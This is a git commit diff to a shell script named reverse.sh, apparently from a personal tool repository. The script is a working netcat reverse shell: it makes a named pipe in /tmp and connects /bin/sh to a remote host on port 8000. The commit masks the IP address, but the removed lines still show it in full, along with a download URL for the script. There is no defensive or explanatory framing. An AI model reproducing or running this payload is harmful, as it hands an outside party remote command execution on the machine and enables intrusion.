7b4022945288487a3d589c2ddc3d13e5708759ff
avfisher <brianwangrewa@gmail.com>
2016-03-04 01:10:01 +0800

    Update reverse.sh

--- reverse.sh
+++ reverse.sh
@@ -1,8 +1,9 @@
 #!/bin/sh
-# http://163.44.164.72/download/reverse.sh
+# http://163.**.**.**/download/reverse.sh
 
 a=$(date +%s);
 backpipe="backpipe""$a";
 
 mknod /tmp/$backpipe p;
-/bin/sh 0</tmp/$backpipe | nc 163.44.164.72 8000 1>/tmp/$backpipe;
+/bin/sh 0</tmp/$backpipe | nc 163.**.**.** 8000 1>/tmp/$backpipe;
+
